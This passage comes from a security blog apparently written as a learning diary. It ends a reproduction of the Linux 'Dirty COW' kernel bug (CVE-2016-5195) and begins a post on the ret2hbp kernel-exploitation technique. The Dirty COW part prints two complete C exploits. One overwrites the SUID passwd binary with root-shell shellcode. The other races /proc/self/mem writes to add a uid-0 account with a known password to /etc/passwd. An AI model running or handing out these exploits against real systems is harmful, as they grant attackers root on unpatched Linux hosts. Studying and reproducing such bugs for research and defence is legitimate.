class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">int</span> data_len = <span class="hljs-number">149</span>;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><span class="hljs-type">int</span> dest_fd, fake_fd, mem_fd;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> attack_data[] = &#123;<br>  <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>  <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mem_fd is %d\n&quot;</span>, mem_fd);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>       lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>       write(mem_fd, attack_data, data_len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <br>    dest_fd = open(<span class="hljs-string">&quot;/usr/bin/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    <br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306190421.png" style="zoom: 80%;" /><p><strong>碎碎念：</strong></p><p>​首先我试图用<code>strlen</code>完成对<code>shellcode</code>的计数，但是无论如何都无法成功，估计是<code>strlen</code>会对内存中的页布局有影响🤔（如果有带师傅了解是什么原因请务必联系一下铸币笔者，不胜感激呜呜呜😭😭😭）</p><p>​其次是随便拉了一个<code>kernel</code>题的文件系统，替换了下内核便充当漏洞复现环境了，结果具有<code>suid</code>的文件只有<code>busybox</code>一个，这玩意根本覆写不了一点，写完直接<code>kernel panic</code>。然后放了一个手动赋予<code>suid</code>的<code>test</code>程序进去，覆写完执行会<code>segment fault</code>。无奈只能下了一个<code>ubuntu14.04</code>。</p><p>​最后便是提完权后，过一会会，也会<code>dump</code>掉。</p><h2 id="利用-etc-passwd-完成提权"><a href="#利用-etc-passwd-完成提权" class="headerlink" title="利用&#x2F;etc&#x2F;passwd&#x2F;完成提权"></a>利用&#x2F;etc&#x2F;passwd&#x2F;完成提权</h2><p>往&#x2F;etc&#x2F;passwd新添一个具有root权限的用户即可</p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;crypt.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><span class="hljs-type">int</span> dest_fd, fake_fd, mem_fd;<br><span class="hljs-type">int</span> info_len;<br><span class="hljs-type">char</span> * info_data;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd_info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * name;<br>    <span class="hljs-type">char</span> * password;<br>    <span class="hljs-type">int</span> uid;<br>    <span class="hljs-type">int</span> gid;<br>    <span class="hljs-type">char</span> * info;<br>    <span class="hljs-type">char</span> * home_dir;<br>    <span class="hljs-type">char</span> * shell;<br>&#125;;<br><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mem_fd is %d\n&quot;</span>, mem_fd);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>       lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>       write(mem_fd, info_data, info_len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd_info</span> <span class="hljs-title">korey_info</span>;</span><br>    <br>    korey_info.name = <span class="hljs-string">&quot;korey&quot;</span>;<br>    korey_info.password = <span class="hljs-string">&quot;password&quot;</span>;<br>    korey_info.uid = <span class="hljs-number">0</span>;<br>    korey_info.gid = <span class="hljs-number">0</span>;<br>    korey_info.info = <span class="hljs-string">&quot;korey0sh1&#x27;s shell&quot;</span>;<br>    korey_info.home_dir = <span class="hljs-string">&quot;/root&quot;</span>;<br>    korey_info.shell = <span class="hljs-string">&quot;/bin/bash&quot;</span>;<br><br>    info_len = <span class="hljs-built_in">snprintf</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,<br>    korey_info.name,<br>    crypt(korey_info.password, korey_info.name),<br>    korey_info.uid,<br>    korey_info.gid,<br>    korey_info.info,<br>    korey_info.home_dir,<br>    korey_info.shell<br>    );<br><br>    info_data = <span class="hljs-built_in">malloc</span>(info_len + <span class="hljs-number">10</span>);<br>    <br>    <span class="hljs-built_in">sprintf</span>(info_data, <span class="hljs-string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,<br>    korey_info.name,<br>    crypt(korey_info.password, korey_info.name),<br>    korey_info.uid,<br>    korey_info.gid,<br>    korey_info.info,<br>    korey_info.home_dir,<br>    korey_info.shell<br>    );<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;info is &quot;</span>);<br>    write(<span class="hljs-number">1</span>, info_data, info_len);<br><br><br>    dest_fd = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    <br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><code>crypt.h</code>是个外部库，所以编译的时候要手动加个<code>-lcrypt</code></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306201207.png"></p><p>这个就舒服多了</p><h1 id="0xff：写在最后"><a href="#0xff：写在最后" class="headerlink" title="0xff：写在最后"></a>0xff：写在最后</h1><p>前后花了一周左右，才磕磕碰碰地复现完了这个古早的<strong>CVE</strong></p><p>本来想着这么老的洞，能不能试试不看别的师傅的解析和poc，自己搞明白并把exp写出来😭😭😭</p><p>结果大失败呜呜呜🥵🥵🥵</p><p>回首看8年前的<strong>dirtycow</strong>，笔者深深地被<code>Linux</code>内核利用，这门<code>old school</code>的黑客美学折服</p><p>现在终于明白小七师傅说的：内核利用的发展路程本身的魅力已经足够吸引人，在海边沙滩上捡到一个贝壳已经足够开心: )</p><p>望能不断坚持: )</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/">【CVE.0x00】CVE-2016-5195 “脏牛”漏洞复现及简要分析 - arttnba3’s blog</a></p><p><a href="https://zhuanlan.zhihu.com/p/583209105">剖析脏牛3_-proc-self-mem是怎么实现的 - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2hbp</title>
    <link href="/2024/01/29/ret2hbp/"/>
    <url>/2024/01/29/ret2hbp/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00：写在一切之前"><a href="#0x00：写在一切之前" class="headerlink" title="0x00：写在一切之前"></a>0x00：写在一切之前</h1><p>终于磕磕绊绊到kernel了，感慨万千呜呜😭😭😭</p><p>希望能在这classic的美学中有所收获吧</p><p>起初是👴啃了两个礼拜A3👴的博客，想找点题练练手，就去做了SCTF2023那几道kernel题，于是便有了ret2hbp的学习手记</p><h1 id="0x01：what-is-ret2hbp？"><a href="#0x01：what-is-ret2hbp？" class="headerlink" title="0x01：what is ret2hbp？"></a>0x01：what is ret2hbp？</h1><p>首先我们假设有一个very nice的任意地址写，有以下几个buff😀</p><ul><li>无限次数</li><li>能长时间存在</li><li>长度任意可控</li></ul><p>看起来十分白给，but还没有泄露kalsr，所以一些常规的攻击手法8是很行的通呜呜</p><p>于是，我们首先要干的事情是leak一些好康的东西出来。</p><p>在<strong>Linux x86-64</strong>体系结构下，处理特定中断和异常的过程中，CPU会跳转到相应的栈并记录当前的寄存器内容。这些栈被定位在一个固定的、未进行随机化的虚拟地址空间中，每种中断或异常都对应不同的栈。这些栈位于一个名为<code>struct cpu_entry_area</code>的结构体字段内。</p><p>关于<code>struct cpu_entry_area</code>的静态和非随机化位置，我们可以通过查看Linux内核的实现来了解其具体位置。具体来讲，内核通过<code>get_cpu_entry_area()</code>函数来访问这个结构体的位置。这个函数负责提供对应的地址，让系统能够定位到这个特定区域。</p><p>这边采用的是5.11.0版本的kernel</p><p>以下分析内容来源于此<a href="https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">一种借助硬件断点的提权思路分析与演示 (veritas501.github.io)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">noinstr <span class="hljs-keyword">struct</span> cpu_entry_area *<span class="hljs-title function_">get_cpu_entry_area</span><span class="hljs-params">(<span class="hljs-type">int</span> cpu)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> va = CPU_ENTRY_AREA_PER_CPU + cpu * CPU_ENTRY_AREA_SIZE;<br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cpu_entry_area) % PAGE_SIZE != <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">struct</span> cpu_entry_area *) va;<br>&#125;<br></code></pre></td></tr></table></figure><p>笔者实在是懒，具体数值是多少👴也8想算了，直接gdb里看了</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240201212227.png" style="zoom:50%;" /><p>于是乎，在5.11.0中，0xfffffe0000001000便是这个结构体的固定地址</p><p>处理中断时所用的栈位于<code>struct cpu_entry_area</code>结构体内的<code>estacks</code>字段中。这个字段包含了用于中断栈表（<code>Interrupt Stack Table</code>，简称IST）的栈，为不同类型的中断和异常提供了专用的栈空间。通过这种方式，Linux确保在处理中断和异常时，能够安全地切换栈空间，同时保留当前的寄存器状态，这些栈被设计为位于一个预定的、非随机化的虚拟地址空间，以便于访问和管理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Exception stacks used for IST entries with guard pages.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cea_exception_stacks</span> <span class="hljs-title">estacks</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>在<code>struct cea_exception_stacks</code>中针对每一种类型都有对应的栈：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ESTACKS_MEMBERS(guardsize, optional_stack_size)\</span><br><span class="hljs-meta">charDF_stack_guard[guardsize];\</span><br><span class="hljs-meta">charDF_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charNMI_stack_guard[guardsize];\</span><br><span class="hljs-meta">charNMI_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charDB_stack_guard[guardsize];\</span><br><span class="hljs-meta">charDB_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charMCE_stack_guard[guardsize];\</span><br><span class="hljs-meta">charMCE_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charVC_stack_guard[guardsize];\</span><br><span class="hljs-meta">charVC_stack[optional_stack_size];\</span><br><span class="hljs-meta">charVC2_stack_guard[guardsize];\</span><br><span class="hljs-meta">charVC2_stack[optional_stack_size];\</span><br><span class="hljs-meta">charIST_top_guard[guardsize];\</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">/* The exception stacks&#x27; physical storage. No guard pages required */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exception_stacks</span> &#123;</span><br>ESTACKS_MEMBERS(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>这些栈主要用于在从用户模式切换到内核模式的过程中，以及在内核模式下处理异常情况。它们通过<code>tss_setup_ist()</code>函数注册到相应的中断栈表（IST）项中，以确保在遇到特定的中断或异常时，系统能够正确地使用这些预设的栈进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tss_setup_ist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tss_struct *tss)</span><br>&#123;<br><span class="hljs-comment">/* Set up the per-CPU TSS IST stacks */</span><br>tss-&gt;x86_tss.ist[IST_INDEX_DF] = __this_cpu_ist_top_va(DF);<br>tss-&gt;x86_tss.ist[IST_INDEX_NMI] = __this_cpu_ist_top_va(NMI);<br>tss-&gt;x86_tss.ist[IST_INDEX_DB] = __this_cpu_ist_top_va(DB);<br>tss-&gt;x86_tss.ist[IST_INDEX_MCE] = __this_cpu_ist_top_va(MCE);<br><span class="hljs-comment">/* Only mapped when SEV-ES is active */</span><br>tss-&gt;x86_tss.ist[IST_INDEX_VC] = __this_cpu_ist_top_va(VC);<br><br></code></pre></td></tr></table></figure><p>在x86-64架构下，中断栈表（IST，Interrupt Stack Table）包含了7个每个CPU特有的条目，用于处理包括双重故障（Double Fault）、非屏蔽中断（NMI）、调试（DEBUG）等在内的特定中断类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The index for the tss.ist[] array. The hardware limit is 7 entries.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_DF0</span><br><span class="hljs-meta">#<span 